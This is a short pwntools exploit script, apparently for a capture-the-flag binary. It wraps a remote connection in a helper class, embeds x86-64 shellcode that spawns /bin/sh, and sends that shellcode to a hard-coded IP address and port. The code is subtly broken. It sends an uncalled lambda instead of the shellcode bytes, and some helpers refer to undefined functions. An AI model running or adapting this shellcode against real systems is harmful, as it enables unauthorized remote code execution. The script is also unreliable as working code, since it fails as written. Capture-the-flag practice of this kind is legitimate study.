from pwn import *


# local=0
# pc='./when_did_you_born'
# aslr=True
# context.log_level=True
# context.terminal = ["deepin-terminal","-x","sh","-c"]
# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

# if local==1:
#     #p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
#     p = process(pc,aslr=aslr)
#     #gdb.attach(p,'c')
# else:
class pf :
    shellocde1 = lambda x=0x70 :  b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05".ljust(x, b"b")
    def __init__(self,add="",port=1024):
        self.p=remote(add,port)
        self.r = lambda: self.p.recv()
        self.rx = lambda x: self.p.recv(x)
        self.ru = lambda x: self.p.recvuntil(x)
        self.rud = lambda x: self.p.recvuntil(x, drop=True)
        self.s = lambda x: self.p.send(x)
        self.sl = lambda x: self.p.sendline(x)
        self.sa = lambda x, y: self.p.sendafter(x, y)
        self.sla = lambda x, y: self.p.sendlineafter(x, y)
        self.close = lambda: self.p.close()
        self.debug = lambda: self.gdb.attach(p)
        self.shell = lambda: self.p.interactive()
    def __del__(self):
        self.close()
    def lg(self,s,addr):
        print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    def raddr(self,a=6):
        if(a==6):
            return u64(rv(a).ljust(8,'\x00'))
        else:
            return u64(rl().strip('\n').ljust(8,'\x00'))


if __name__=="__main__":
    p = pf('82.157.24.238', 51400)
    p.s(pf.shellocde1)
    print(p.r())